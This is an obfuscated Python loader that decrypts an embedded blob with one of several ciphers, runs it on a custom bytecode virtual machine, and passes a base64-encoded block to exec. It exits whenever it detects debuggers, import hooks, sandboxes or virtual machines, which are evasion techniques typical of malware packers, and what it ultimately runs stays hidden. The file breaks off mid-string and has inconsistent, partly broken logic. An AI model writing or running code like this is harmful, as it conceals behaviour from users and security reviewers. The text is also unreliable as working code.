#!/usr/bin/env python3
def _dvvvk(_kxyxqo):
    return _kxyxqo % 5192 + 1

import hashlib as _wn, hmac as _nkwl, base64 as _hi, sys as _alqld, zlib as _feqnm
_kxyxqo = 958897
_mbex = """/o5le6k+RcfoFofS5j6tCVVeNHgyKJ7fjUJp85/ClY1TVpaUtMTExykDB4iCJO1DzffLzujF1Iab3RALhyrfy9boOevGQ+G/854GW2f/gbfhhyOMj3zGBI2vi6fxzBdLErTm/g+YxH8Ynz1JZjEv/zeXbKbK0wMXsRwCIGUiYao5hWZzVUmxp07r+JqIAEZ3tQa38YrHYbdjsKDwPoU7Fv4+YNBI1cyaDFwUif+oKiHZoQMrdeaO07sIw0GTpGrZbSwJfW9VE66R6HnxvKmdEmHDuTXCos91vEYwwtdtEPfUbqnEvmuRrVSwkph9CUOsaBodwXLSvCBOiNYJCQ5hmuCqMybWPcsaU5em09/xCeN+4M1XP4wzE/Y94cneQXFeAQEw/HnNXAYwGMT16zdBByEZNpKCNEQZ4yQFwKsdcR7SlKmd8sku2pJwgzI/LzGcbbrx3lj+pC7NYxNiXZoUjvmzkcb+NP8jGDG0um75xSxYefmRyfmQKRs5UOvKl4m2iH2uWbuMOVca7qtwkXU+rpHB5tyAfEeRpoLFMAWucWHzupWW3hMa0gfGNpMIFy37FEOPvfSeN4swTrafh8/slDMoRbtXaDouysMarlPO4EdzGUG8pYmadcsS3UzDYAzTN6LjQCa1WTTphioumoueGbcV/TBAh7jjgfueZAcxe6hYV54HkNYctOqh0Ioxc3N+Im6T03GyYm7Ss4EEd+a+rGfMDoFttB2lz228Xue7XFtkEltbsypijpSWwi2WLji/XCKlHQL8eKUGcu3Ola1GKVYB/qmrmH7blMVswQuUt43zFFc07WZu7PdSmlv2YFZmHzm/pwZLAb0hGuTUL0DWDp/MolKvhIFBC/wtgwT3lg8Qjkk0DxSzKdZy20xAIIBZFAXKJ5/GoOcbyOUvkLqMwBr3MjGeCEjkEee7f8W+7OizT+G5rhKnk2Z//6o0maJZHFxKIf6d6YjeNxigs649ov5wc0nxhyzI1uT71Rc0hl5ZQ0txroQTXDKR/SzGnD/N5hnwH6TN1j6YrbTrDeJ3cBTiKU7RBRrlP0ytoHZguNBoPbud+Q/a1/PoxHF0NIEv31hn/t3OqSvPEaA0TP5avfsHTAfPLgYhOP0CLjZ1VejZq+VoUHYk2V4ItVaqgpcDo3+hCNEC47WSrI0hx4aD0GR7BtyoJsLQ8jU4m+8Ryqoyx2NcfwUMYOYuiPzDWlO0VWHGzcDcdfEHFMn42F839fLV+VAUVN3nGucg78SrLVP0KF1ExXzo5HHkw5Fk91tMIgB8ILoqMGic+1qcx2DLY/OMtRZiAKWbEKpOwhff0mJyCap9krCr8YqppEdMWHqKQUO7YPCyhrU+VgJGsy5tTErswOKYfnGeqDhAN+UCbE4tAC+vSMYA3GaYkMeuykg57qrOIbWGXNkGQLvOVxMSTAnjPuMYRfwFSH6KF9VtnI2x4JYzGY3pzCtyW620zuM/z4DOKAwJAs2thinz6jjg4bA8C5l4NB+CVazHr+pf2SRY"""
_dw = 3
_rhbg = _dvvvk(_kxyxqo)

def _vm_run(_code, _consts, _names, _globals, _locals, _map, _op_key):
    import sys
    if sys.gettrace() is not None: sys.exit(1)
    if any(x in globals() for x in ['pdb', 'inspect', 'trace']): sys.exit(1)
    import random
    _reg_map = list(range(64))
    random.shuffle(_reg_map)
    _r = [None] * 64
    _ip = 0
    _cycle = 0
    _ip_mask = random.getrandbits(32)
    _n = len(_code)
    _b = __builtins__ if isinstance(__builtins__, dict) else __builtins__.__dict__
    while _ip < _n:
        _cycle += 1
        
        _raw = _code[_ip:_ip+8]
        _dec = bytes([_raw[i] ^ _op_key[i % 32] for i in range(len(_raw))])
        
        _op = _map[_dec[0]]
        _rd = _reg_map[_dec[1]]
        _rs1 = _reg_map[_dec[2]]
        _rs2 = _reg_map[_dec[3]]
        _imm = _dec[4] | (_dec[5] << 8) | (_dec[6] << 16) | (_dec[7] << 24)
        if _op == 0:
            pass
        elif _op == 1:
            _r[_rd] = _consts[_imm]
        elif _op == 2:
            _nm = _names[_imm]
            _r[_rd] = _globals.get(_nm) if _nm in _globals else _b.get(_nm, _nm)
        elif _op == 3:
            _globals[_names[_imm]] = _r[_rd]
        elif _op == 4:
            _r[_rd] = _locals.get(_names[_imm], None)
        elif _op == 5:
            _locals[_names[_imm]] = _r[_rd]
        elif _op == 6:
            _r[_rd] = _r[_rs1]
        elif _op == 60:
            _r[_rd] = getattr(_r[_rs1], _names[_imm])
        elif _op == 61:
            _r[_rd] = __import__(_names[_imm])
        elif _op == 10:
            _r[_rd] = _r[_rs1] + _r[_rs2]
        elif _op == 11:
            _r[_rd] = _r[_rs1] - _r[_rs2]
        elif _op == 12:
            _r[_rd] = _r[_rs1] * _r[_rs2]
        elif _op == 13:
            _r[_rd] = _r[_rs1] / _r[_rs2]
        elif _op == 14:
            _r[_rd] = _r[_rs1] ** _r[_rs2]
        elif _op == 15:
            _r[_rd] = -_r[_rs1]
        elif _op == 20:
            _r[_rd] = _r[_rs1] == _r[_rs2]
        elif _op == 21:
            _r[_rd] = _r[_rs1] != _r[_rs2]
        elif _op == 22:
            _r[_rd] = _r[_rs1] < _r[_rs2]
        elif _op == 23:
            _r[_rd] = _r[_rs1] <= _r[_rs2]
        elif _op == 24:
            _r[_rd] = _r[_rs1] > _r[_rs2]
        elif _op == 25:
            _r[_rd] = _r[_rs1] >= _r[_rs2]
        elif _op == 30:
            _ip = _imm * 8
            continue
        elif _op == 31:
            if _r[_rd]:
                _ip = _imm * 8
            else:
                _ip += 8
            continue
        elif _op == 32:
            if not _r[_rd]:
                _ip = _imm * 8
            else:
                _ip += 8
            continue
        elif _op == 33:
            _r[_rd] = _r[_rs1][_r[_rs2]]
        elif _op == 50:
            _r[_rs1][_r[_rs2]] = _r[_rd]
        elif _op == 40:
            _fn = _r[_rs1]
            _sfn = _dec[2]
            _args = tuple(_r[_reg_map[_sfn + 1 + _i]] for _i in range(_imm & 0xFFFF))
            _r[_rd] = _fn(*_args)
        elif _op == 41:
            _s = _dec[2]
            _r[_rd] = _names[_rd](*[_r[_reg_map[_s + _i]] for _i in range(_imm & 0xFFFF)])
        elif _op == 42:
            return _r[_rd]
        elif _op == 43:
            _s = _dec[2]
            _r[_rd] = tuple(_r[_reg_map[_s + _i]] for _i in range(_dec[3]))
        elif _op == 44:
            _s = _dec[2]
            _r[_rd] = list(_r[_reg_map[_s + _i]] for _i in range(_dec[3]))
        elif _op == 62:
            _r[_rd] = str(_r[_rs1])
        elif _op == 63:
            _s = _dec[2]
            _r[_rd] = ''.join(str(_r[_reg_map[_s + _i]]) for _i in range(_dec[3]))
        elif _op == 70:
            _r[_rd] = iter(_r[_rs1])
        elif _op == 71:
            try:
                _r[_rd] = next(_r[_rs1])
            except StopIteration:
                _ip = _imm * 8
                continue
        elif _op == 72:
            _r[_rd].extend(_r[_rs1])
        elif _op == 75:
            _r[_rd].append(_r[_rs1])
        elif _op == 52:
            _v = _r[_rs1]
            try:
                if _imm == 0:
                    if not (_v + 1 == _v): pass
                elif _imm == 1:
                    if not (_v != _v): pass
                else:
                    if not (_v - 1 == _v): pass
            except TypeError:
                pass
        elif _op == 53:
            _v = _r[_rs1]
            try:
                if _imm == 0:
                    if _v * 0 != 0: pass
                elif _imm == 1:
                    if _v != _v: pass
                else:
                    if _v + 1 == _v: pass
            except TypeError:
                pass
        _ip += 8

def _vm_deserialize(_data):
    import struct
    _op_key = _data[:32]
    _decrypted = _data[32:]
    
    _map = list(_decrypted[:256])
    _pos = 256
    _cc = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
    _consts = []
    for _ in range(_cc):
        _t = _decrypted[_pos]; _pos += 1
        _sl = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
        _s = _decrypted[_pos:_pos+_sl]; _pos += _sl
        if _t == 0: _v = None
        elif _t == 1: _v = _s == b'1'
        elif _t == 2: _v = int(_s)
        elif _t == 3: _v = float(_s)
        elif _t == 4: _v = _s.decode('utf-8')
        elif _t == 7: _v = _s
        else: _v = _s
        _consts.append(_v)
    _nc = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
    _names = []
    for _ in range(_nc):
        _nl = int.from_bytes(_decrypted[_pos:_pos+2], 'little'); _pos += 2
        _names.append(_decrypted[_pos:_pos+_nl].decode('utf-8')); _pos += _nl
    _ic = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
    _code = _decrypted[_pos:_pos+_ic*8]
    return _code, _consts, _names, _map, _op_key




def _wr():
    if _alqld.gettrace() is not None:
        _alqld.stderr.write('error: debugger detected\n'); _alqld.exit(1)
    _blqovm = bytes.fromhex("909991968182adc09b9fb2c18199c1b58fb3b28d96b284a58592bf83bbafb49e859ac2a7af9fb1c5b0b1a6a49fa48db5b4bb8fc0bfaf9e81c0998fb6b8b49ec69186b0a1a4c6829cb0be9cae85b0b0b0a7b6869bba8fa7c2b4909291bd80ba928fa0c393c7adb1bec39dcec4baa7a69bc186b4b9c58386baaeb68194af9aae8fb4bfb085c7a49898b88fb985bbb8b9b484b998929e9d8386b49d9e92ce96c795c6ce848f87c184c295a69ab2a2c4c684b183a2cfa3b295bda6be9987b0a493afb9cf9887b68182a7a4a18f9c94a383c49dc2cfae9ec4b180c1bdb8b9c4bfa4cebe9c9985b8b596b3ce8f909d908f98bb85b5c7b1bdc383b2b193c182cea398a795cea1a5cfa5c5a7aec5c084b0b48796baa6b196b2ba998dcf8595be9b85bab8b3beb3baada791919f84bbadb1a492c3baaf9894c2bc8081b6bd8183cfc5c6b39493b2bebb9bbdb4b395b58199b1869e949e9393bfc1bba18399af80a59e8eb09cb2b9c4a68e81c38eb3af90ce98829bb180bea0afc5b5b1c3a5a1af95a4858db5cfa6a39cbb8fbdb6cec6b0adb282a285b6b398afa6cfc3a0a3bcbda1b2a7cfb6b480b29e8fb18386b8b8af87c291a5b3b480aebfbfcec4b08ea6a6c394c1b999becfc2b1bea49b8ec09098a6a0c698a399a19ba39190bba7b596b1a2aeb9b996b0b384a2c7b9a0b4a2b486a38dba87a380a2959cbc8093958098c7becebeb386b1c5babdb58793c1ceb09cc199b3858f9eb6a6adbac1a2a4c3b3a29485879fada08eb68790c480b5c3b58592bfbea0a593a5c6cfc581c3a092c2b39d92c6958dafa680949493a3bbc7a5bbb08183c384c3a496b5b4c7a3ada79a9a8282afc1bfb48f8f819b859ab8c3c0bccea4b5b0cfb4939fa1858d80ce81b0b483adb8bbc387b4bc87b283b19e9abeb89384a3c4c78fa5cfb08e80ba9e959ec691b1b3bea6b4c1cf9db5a09dc1c0b2ba9d9bb6849bc586b6c381919a95bfb1c383ba82b6809f93c4ba92908da09487bdb992aea192ce93b5a4c6bf9cbaaea1b0bea1c5a3a7af86b5c3b093c382bbad9293a5b2c0b39a809481bfb3b5a3a5b9b8a595cebeb9c1c592b5cfbbbec491a4b2c28098a5a7cfa0b591a2a79f939da284c6b0b68eb9b4baa79591ae80b6afb8cf8fa7b986bd93a0b9afb586a080b5cebfbcb8a19b80b598a6839ea3a5b6a6bdcfa4c1b285b8929bb095b8a49f908e949d9aceb09ab6a3b5bc82a1958ebac180afa1a5b59ab392b294ada1a1a29f9b98c0c0a0b1bf92ae80a5cf9dba8287939a8599afbac0a2bc9bb898b9b09294a1b893c6879aa3c0b88f84adba85af87c7b398a5bc908f9193bf93bdbfafb89eb4afc6bf8493b8b2a2a585a3bbbb9a939eb293b2b093a486adb4b18f9585b087c39d95b099cfae8281a49dc392b996bd80bac798a29e8db5cf91a696a39eb1a3bdc6bfa4bac3b0")
    _blqovm = bytes(_ ^ 247 for _ in _blqovm).decode()
    _alqld.breakpointhook = None
    for _qm in ('pydevd','pdb','ipdb','pdbpp','pydevconsole'):
        if _qm in _alqld.modules:
            _alqld.stderr.write('error: debugger detected\n'); _alqld.exit(1)
    _zviy = _hi.b64decode(_mbex)
    for _qn in ('__import__','compile','exec'):
        _qf = getattr(_alqld.modules.get('builtins'), _qn, None)
        if _qf is not None:
            _qg = getattr(_qf, '__name__', '')
            if _qg != _qn:
                _alqld.stderr.write('error: hook detected\n'); _alqld.exit(1)
    if len(_alqld.meta_path) > 5:
        _alqld.stderr.write('error: import hook detected\n'); _alqld.exit(1)
    if getattr(_alqld, 'flags', None) and _alqld.flags.no_user_site:
        _alqld.stderr.write('error: sandbox detected\n'); _alqld.exit(1)
    import os
    if any(x in str(_alqld.platform) or any(y in os.listdir('/proc/sys/kernel') for y in ['//', 'vm']) for x in ['vmware', 'virtualbox', 'qemu']):
        _alqld.stderr.write('error: virtual machine detected\n'); _alqld.exit(1)
    if _dw == 9:
        def _gklsaon(_qv):
            if _qv[:2] == b'<~': _qv = _qv[2:]
            if _qv[-2:] == b'~>': _qv = _qv[:-2]
            _rhm = bytearray(); _zpyq = 0
            while _zpyq < len(_qv):
                if _qv[_zpyq] == 122:
                    _rhm.extend(b'\x00\x00\x00\x00'); _zpyq += 1; continue
                _vnv = 0; _kd = 0
                while _zpyq < len(_qv) and _kd < 5:
                    _vnv = _vnv * 85 + (_qv[_zpyq] - 33); _zpyq += 1; _kd += 1
                _qklvsx = _kd - 1
                if _qklvsx > 0: _rhm.extend(_vnv.to_bytes(4, 'big')[4-_qklvsx:])
            return bytes(_rhm)
        _pnic = _gklsaon(_zviy)
    elif _dw == 0:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher as _nztj, algorithms as _xsjb, modes as _ksz
        except ImportError:
            _alqld.stderr.write("error: cryptography not installed\n"); _alqld.exit(1)
        _buogn = _zviy[:16]; _wllzw = _zviy[-32:]; _upqxtn = _zviy[16:-32]
        _ouq = _wn.pbkdf2_hmac('sha256', _blqovm.encode(), _buogn, 100000, dklen=64)
        _tlaujy = _ouq[:32]; _nekgcd = _ouq[32:64]
        _lchxbfa = _nkwl.new(_nekgcd, _upqxtn, digestmod='sha256').digest()
        if not _nkwl.compare_digest(_wllzw, _lchxbfa):
            _alqld.stderr.write("error: integrity check failed\n"); _alqld.exit(1)
        _zqjve = _nztj(_xsjb.AES(_tlaujy), _ksz.ECB())
        _pnic = _zqjve.decryptor()
        _pnic = _pnic.update(_upqxtn) + _pnic.finalize()
        _ij = _pnic[-1]
        if _ij < 1 or _ij > 16 or not all(_ == _ij for _ in _pnic[-_ij:]):
            _alqld.stderr.write("error: decryption failed\n"); _alqld.exit(1)
        _pnic = _pnic[:-_ij]
    elif _dw == 10:
        _pnic = bytes.fromhex(_zviy.decode('ascii'))
    elif _dw == 12:
        _buogn = _zviy[:16]; _wllzw = _zviy[-32:]; _upqxtn = _zviy[16:-32]
        _ouq = _wn.pbkdf2_hmac('sha256', _blqovm.encode(), _buogn, 100000, dklen=64)
        _tlaujy = _ouq[:32]; _nekgcd = _ouq[32:64]
        _lchxbfa = _nkwl.new(_nekgcd, _upqxtn, digestmod='sha256').digest()
        if not _nkwl.compare_digest(_wllzw, _lchxbfa):
            _alqld.stderr.write("error: integrity check failed\n"); _alqld.exit(1)
        _ij = 3 + (_buogn[0] & 7)
        _buogn = bytearray(_upqxtn)
        for _cugo in range(_ij - 1, -1, -1):
            _dvvvk = (3 + _cugo) & 7
            _kxyxqo = (_cugo * 0x1B + 0x5A) & 0xFF
            for _tahji in range(len(_buogn)):
                _ij = _buogn[_tahji]
                _ij ^= _kxyxqo
                _ij = ((_ij >> _dvvvk) | ((_ij << (8 - _dvvvk)) & 0xFF))
                _ij ^= _tlaujy[(_cugo * len(_buogn) + _tahji) % len(_tlaujy)]
                _buogn[_tahji] = _ij
        _pnic = bytes(_buogn)
    elif _dw == 5:
        _buogn = _zviy[:16]; _wllzw = _zviy[-32:]; _upqxtn = _zviy[16:-32]
        _ouq = _wn.pbkdf2_hmac('sha256', _blqovm.encode(), _buogn, 100000, dklen=64)
        _tlaujy = _ouq[:32]; _nekgcd = _ouq[32:64]
        _lchxbfa = _nkwl.new(_nekgcd, _upqxtn, digestmod='sha256').digest()
        if not _nkwl.compare_digest(_wllzw, _lchxbfa):
            _alqld.stderr.write("error: integrity check failed\n"); _alqld.exit(1)
        _pnic = bytes(_upqxtn[i] ^ _tlaujy[i % 32] for i in range(len(_upqxtn)))
    elif _dw == 13:
        _buogn = _zviy[:16]; _wllzw = _zviy[-32:]; _upqxtn = _zviy[16:-32]
        _ouq = _wn.pbkdf2_hmac('sha256', _blqovm.encode(), _buogn, 100000, dklen=80)
        _tlaujy = _ouq[:32]; _tahji = _ouq[32:48]; _nekgcd = _ouq[48:80]
        _lchxbfa = _nkwl.new(_nekgcd, _upqxtn, digestmod='sha256').digest()
        if not _nkwl.compare_digest(_wllzw, _lchxbfa):
            _alqld.stderr.write("error: integrity check failed\n"); _alqld.exit(1)
        import struct as _rhbg
        def _dvvvk(k,c,n):
            s=[0x61707865,0x3320646e,0x79622d32,0x6b206574]
            for i in range(0,32,4):s.append(_rhbg.unpack('<I',k[i:i+4])[0])
            s.append(c&0xFFFFFFFF)
            for i in range(0,12,4):s.append(_rhbg.unpack('<I',n[i:i+4])[0])
            w=list(s)
            def q(a,b,c,d):
                a=(a+b)&0xFFFFFFFF;d^=a;d=((d<<16)|(d>>16))&0xFFFFFFFF
                c=(c+d)&0xFFFFFFFF;b^=c;b=((b<<12)|(b>>20))&0xFFFFFFFF
                a=(a+b)&0xFFFFFFFF;d^=a;d=((d<<8)|(d>>24))&0xFFFFFFFF
                c=(c+d)&0xFFFFFFFF;b^=c;b=((b<<7)|(b>>25))&0xFFFFFFFF
                return a,b,c,d
            for _ in range(10):
                w[0],w[4],w[8],w[12]=q(w[0],w[4],w[8],w[12])
                w[1],w[5],w[9],w[13]=q(w[1],w[5],w[9],w[13])
                w[2],w[6],w[10],w[14]=q(w[2],w[6],w[10],w[14])
                w[3],w[7],w[11],w[15]=q(w[3],w[7],w[11],w[15])
                w[0],w[5],w[10],w[15]=q(w[0],w[5],w[10],w[15])
                w[1],w[6],w[11],w[12]=q(w[1],w[6],w[11],w[12])
                w[2],w[7],w[8],w[13]=q(w[2],w[7],w[8],w[13])
                w[3],w[4],w[9],w[14]=q(w[3],w[4],w[9],w[14])
            r=bytearray()
            for i in range(16):r.extend(_rhbg.pack('<I',(s[i]+w[i])&0xFFFFFFFF))
            return bytes(r)
        _cugo = _rhbg.unpack('<I',_tahji[:4])[0]
        _tahji = _tahji[4:]
        _buogn = bytearray()
        while len(_buogn) < len(_upqxtn):
            _ij = _dvvvk(_tlaujy, _cugo, _tahji)
            for _kxyxqo in range(min(64, len(_upqxtn) - len(_buogn))):
                _buogn.append(_upqxtn[len(_buogn)] ^ _ij[_kxyxqo])
            _cugo += 1
        _pnic = bytes(_buogn)
    elif _dw == 4:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher as _nztj, algorithms as _xsjb, modes as _ksz
        except ImportError:
            _alqld.stderr.write("error: cryptography not installed\n"); _alqld.exit(1)
        _buogn = _zviy[:16]; _wllzw = _zviy[-32:]; _upqxtn = _zviy[16:-32]
        _ouq = _wn.pbkdf2_hmac('sha256', _blqovm.encode(), _buogn, 100000, dklen=80)
        _tlaujy = _ouq[:32]; _tahji = _ouq[32:48]; _nekgcd = _ouq[48:80]
        _lchxbfa = _nkwl.new(_nekgcd, _upqxtn, digestmod='sha256').digest()
        if not _nkwl.compare_digest(_wllzw, _lchxbfa):
            _alqld.stderr.write("error: integrity check failed\n"); _alqld.exit(1)
        _zqjve = _nztj(_xsjb.ChaCha20(_tlaujy, _tahji), mode=None)
        _pnic = _zqjve.decryptor().update(_upqxtn)
    elif _dw == 7:
        _pnic = _hi.b32decode(_zviy)
    elif _dw == 6:
        _pnic = _hi.b64decode(_zviy)
    elif _dw == 1:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher as _nztj, algorithms as _xsjb, modes as _ksz
        except ImportError:
            _alqld.stderr.write("error: cryptography not installed\n"); _alqld.exit(1)
        _buogn = _zviy[:16]; _wllzw = _zviy[-32:]; _upqxtn = _zviy[16:-32]
        _ouq = _wn.pbkdf2_hmac('sha256', _blqovm.encode(), _buogn, 100000, dklen=80)
        _tlaujy = _ouq[:32]; _tahji = _ouq[32:48]; _nekgcd = _ouq[48:80]
        _lchxbfa = _nkwl.new(_nekgcd, _upqxtn, digestmod='sha256').digest()
        if not _nkwl.compare_digest(_wllzw, _lchxbfa):
            _alqld.stderr.write("error: integrity check failed\n"); _alqld.exit(1)
        _zqjve = _nztj(_xsjb.AES(_tlaujy), _ksz.CBC(_tahji))
        _pnic = _zqjve.decryptor()
        _pnic = _pnic.update(_upqxtn) + _pnic.finalize()
        _ij = _pnic[-1]
        if _ij < 1 or _ij > 16 or not all(_ == _ij for _ in _pnic[-_ij:]):
            _alqld.stderr.write("error: decryption failed\n"); _alqld.exit(1)
        _pnic = _pnic[:-_ij]
    elif _dw == 2:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher as _nztj, algorithms as _xsjb, modes as _ksz
        except ImportError:
            _alqld.stderr.write("error: cryptography not installed\n"); _alqld.exit(1)
        _buogn = _zviy[:16]; _wllzw = _zviy[-32:]; _upqxtn = _zviy[16:-32]
        _ouq = _wn.pbkdf2_hmac('sha256', _blqovm.encode(), _buogn, 100000, dklen=80)
        _tlaujy = _ouq[:32]; _tahji = _ouq[32:48]; _nekgcd = _ouq[48:80]
        _lchxbfa = _nkwl.new(_nekgcd, _upqxtn, digestmod='sha256').digest()
        if not _nkwl.compare_digest(_wllzw, _lchxbfa):
            _alqld.stderr.write("error: integrity check failed\n"); _alqld.exit(1)
        _zqjve = _nztj(_xsjb.AES(_tlaujy), _ksz.CTR(_tahji))
        _pnic = _zqjve.decryptor().update(_upqxtn)
    elif _dw == 3:
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM as _sehx
        except ImportError:
            _alqld.stderr.write("error: cryptography not installed\n"); _alqld.exit(1)
        _buogn = _zviy[:16]; _wllzw = _zviy[-32:]; _pnic = _zviy[16:-32]
        _upqxtn = _pnic[:-16]; _ij = _pnic[-16:]
        _ouq = _wn.pbkdf2_hmac('sha256', _blqovm.encode(), _buogn, 100000, dklen=76)
        _tlaujy = _ouq[:32]; _tahji = _ouq[32:44]; _nekgcd = _ouq[44:76]
        _lchxbfa = _nkwl.new(_nekgcd, _pnic, digestmod='sha256').digest()
        if not _nkwl.compare_digest(_wllzw, _lchxbfa):
            _alqld.stderr.write("error: integrity check failed\n"); _alqld.exit(1)
        _pnic = _sehx(_tlaujy).decrypt(_tahji, _upqxtn + _ij, None)
    elif _dw == 11:
        _buogn = _zviy[:16]; _wllzw = _zviy[-32:]; _upqxtn = _zviy[16:-32]
        _ouq = _wn.pbkdf2_hmac('sha256', _blqovm.encode(), _buogn, 100000, dklen=64)
        _tlaujy = _ouq[:32]; _nekgcd = _ouq[32:64]
        _lchxbfa = _nkwl.new(_nekgcd, _upqxtn, digestmod='sha256').digest()
        if not _nkwl.compare_digest(_wllzw, _lchxbfa):
            _alqld.stderr.write("error: integrity check failed\n"); _alqld.exit(1)
        _ij = _tlaujy[0]
        _pnic = bytearray()
        for _cugo in range(len(_upqxtn)):
            _buogn = _upqxtn[_cugo] ^ _ij
            _pnic.append(_buogn)
            _ij = _upqxtn[_cugo] ^ _tlaujy[ (_cugo + 1) % len(_tlaujy) ]
            _ij = (((_ij << 3) & 0xFF) | (_ij >> 5)) ^ 0x5A
        _pnic = bytes(_pnic)
    elif _dw == 8:
        _wwngh = ('0','1','2','3','4','5','6','7','8','9',
                'A','B','C','D','E','F','G','H','I','J','K','L','M',
                'N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
                'a','b','c','d','e','f','g','h','i','j','k','l','m',
                'n','o','p','q','r','s','t','u','v','w','x','y','z',
                '!','#','$','%','&','(',')','*','+','-',';','<','=',
                '>','?','@','^','_','`','{','|','}','~')
        _yz = {c:i for i,c in enumerate(_wwngh)}
        def _iwux(_qikna):
            _oah = bytearray(); _bkn = 0
            while _bkn < len(_qikna):
                _sbioxxv = 0; _vv = 0
                while _bkn < len(_qikna) and _vv < 5:
                    _sbioxxv = _sbioxxv * 85 + _yz[chr(_qikna[_bkn])]; _bkn += 1; _vv += 1
                _afgu = _vv - 1
                if _afgu > 0: _oah.extend(_sbioxxv.to_bytes(4, 'big')[4-_afgu:])
            return bytes(_oah)
        _pnic = _iwux(_zviy)
    else:
        _alqld.stderr.write("error: unsupported algorithm\n"); _alqld.exit(1)
    _vk = bytes.fromhex("4e2fcda0e9bf9569b446704242e70f965003f436de1abc75fa2e89acf3fd3985")
    _vn = bytes.fromhex("c27c32ecaaf470f4a884cc80068eadf9")
    _sig = _pnic[-32:]
    _pl = _pnic[4:-32]
    import hmac, hashlib
    if not hmac.compare_digest(_sig, hmac.new(_vk, _pl, hashlib.sha256).digest()):
        _alqld.stderr.write('error: VM integrity check failed\n'); _alqld.exit(1)
        _alqld.stderr.write('error: VM integrity check failed\n'); _alqld.exit(1)
    _pd = bytes([_pl[i] ^ _vk[i % 32] ^ _vn[i % 16] for i in range(len(_pl))])
    _c, _k, _m, _map, _ok = _vm_deserialize(_pd)
    exec(compile(_hi.b64decode("aW1wb3J0IGJhc2U2NAppbXBvcnQgaGFzaGxpYgppbXBvcnQgaG1hYwppbXBvcnQgY3R5cGVzCmltcG9ydCBiYXNlNjQKaW1wb3J0IGhhc2hsaWIKaW1wb3J0IGhtYWMKaW1wb3J0IGN0eXBlcwpfRlVOQ19LRVkgPSBiYXNlNjQuYjY0ZGVjb2RlKCdRODduV1RhNkF2aGVrQ2lGQmJBYlAwQzRkN0JTc1gzWHE1dmVyUnlpQUhZPScpCl9GRU5DX0RBVEEgPSBbYmFzZTY0LmI2NGRlY29kZSgnWHJmUitldzFjMFUwVktVNXdlOHRldmh6eFMvdVI1UFVPOWNKQUVaZHI2amd2eEc3NSs2MkMyQ0x1MG8wcmViOGk1alZrVVhobnJ0Vi8vcTJHdDJvcFJWVitlTGZhbStpYi9MejdKMnZWcTlWZzRvZGRLQUQ3dFRpK1JlVEtVRCtoWld6bndvREpDc1daMTUvMUo2WmhtVFVMa0I2M3NOdlJzeSsrUEUvWjM1cGhoZ3QzUmxYNldxVkhXWkZ0QnVOa0QySFZPNFdlSWZUc0pOUmlPTVlYbzRtL1BUdVpUUFRVY3VkK0p1SlBkMlh2ei9ERjByVVR0eXdRUm9OdW93ZXNEWURMSU1PekZqQ1ZzUXB3TzZ6eEtBWGpOR1ZpUEhiM1ZGUGpQcnJYWXlmQW13Z0pVUmwwR3ZmV3lqd1pXNmxQRjZiS0htdDV0enBOcENFbnM3VjZqNzh6azErTlhxRkljWitsY1pJZmt1ckdzdnZJMzRxeHZzUlE1TkUwUzlaeHpiVTloM3NWRXlYZGV2VlRTMEpKOXZ3UGNSclZkcWhyZDVaUGM5OXd4bGx3N093NlFnbUhtZndlaXBHMC9CdWlpUDZvSUtEWmdyMERoK2JEa3RqeUZNdm50SzFpN1JkVGJQZWZxb0pDVTNYZVlnSXE3WVg4a0ZTZkw2eHY4MEtMV29JMUd3ODQvZkNSM0lCTlVtbXdBemZCYVBWY1hZZWxvOWgxKzc2T2VDMThtamhiSXZBNzF3M2t3WW9xZ0JRdFJyOGF3Z2Fycmc1Mm04TEtxbUxNL1QwdUtQUHpCb21PQ2d1Y2VaUGJYYUd3Q0JQTk1kTS9pTE5XRzN3RXZSM3llMmE0azlZZFBIcTQ5UHZLL1UzQUNVWGtnTHpycWg0MXF6bDY1czFJR2VoSHdMdThmNXBwRVNnNUFjY1VGcXVNeG5rVmZwckgvWE1DeklEUDAzSlN0QzVzclNzSTJJc3RLM2ZWbGtvczZnNjRiQ2lWTkVCcUNmZjBDWUtBNDBEQklNVHJ2T1E0QkZwcWxYR3U2cXFjTVVsUWl0NzU3dUZHY1o5dFRzQkE5ditNb25peWJCTm1CTEZNOXVhT0RicHJxQUQzREU0RTlwOUtMRkR5Vk9hMGFzNzZHeStsdnFyWnZMY0VPYi9xNWZ5OUxJWms3TDBYYWhEcURFV2pERVpMSERWYnVZdDNaQkVQTk5yajN4Qk5zTnM3alVNbTk5RWppUHI4YllQMGUyKzd3S0hiSGcyRTlOU0lLM2h3aVhoWDNMWndIM21KaUJHU3FEcWZ3OElEV0Y0VE5oaDN4TWxGTEtHU0UzeWltUVdVMlJMSytIQi9yOHJoSnJpZTU0N1F2c3ErdmFKbmJ6Rmg2dFhSSDEwdGZCZVo2WmQ5THdIQ0dEQUc3bmRjS2Vya0EwNytrYXhZTno0MHRoZndadWFkd0g4S1UrNysxU0JJVmxmckhzb3FGV2k3UllxRGxYRzNpWU9TbnNvTFEzVVVSRVFrdVFoUDJ2S1VHWjhNdzdsRnlmZW9kYzFtWHVaS1lOdHNLazJnb1d2d0lKa2tPVEhhSU1rWWhVUUJsKzlQNHRBa2QwKytmQms5a0lxaGt2eFkyNU9SWFRTVW1QdUN2QXRieFRqV0h0UDZkY29WajliclRsNEw5cHN3VERwc3RWNXpRWG5wdHJSdk9kZjc3bnpQYkJJVTkyWUhJSGNHVWV6OTUwZVdaalg2WC9LWWhndi9nNUNqWjhxSFhRczh5RzNlMVo3WXNnMkNGN08yNGpTZi93WTFIUXUzMEZnSmdnZW42WTl3QWgvSGtVcTVieGpXVTIzeS8xbVFPZy9jVjZZWWZmcWZyVnNFV0FnSnduL3p5NHV3VXJDTWYrWkpsTHZvRVpQRjZwRWxxY0dzYlhESW5qeEV5ZXh5Uk1JQVgxcjZrM0trNVoyVlE1NEY1UzZHMHBjWkJ3Vytpc2NWMytmb1BpTmg1T2Z6ciswWGYzL1QxYUN0aU9xWXJSdUhvSDQ3M29WVUlRMU9CK2VFZlZ5akg4WUNhc0lncS9LSUZOdHhvYlBWS0t5TkFwVzZybG9aZ1